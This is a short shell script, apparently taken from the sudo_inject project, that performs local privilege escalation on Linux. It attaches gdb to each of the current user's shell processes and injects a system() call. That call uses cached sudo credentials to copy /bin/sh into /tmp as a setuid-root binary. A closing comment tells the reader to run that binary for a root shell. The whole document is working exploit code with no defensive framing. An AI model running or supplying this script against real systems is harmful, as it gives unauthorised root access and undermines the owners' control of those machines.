#!/bin/sh

# SOURCE (check v2): https://github.com/nongiach/sudo_inject/tree/master

# create suid shell
echo "Creating suid shell in /tmp/sh"
echo "Current process : $$"
# inject all shell belonging to the current user, our shell one :p
for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")
do
        echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")
echo 'call system("echo | sudo -S cp /bin/sh /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/sh >/dev/null 2>&1")' \
| gdb -q -n -p "$pid" >/dev/null 2>&1
done

# then run /tmp/sh -p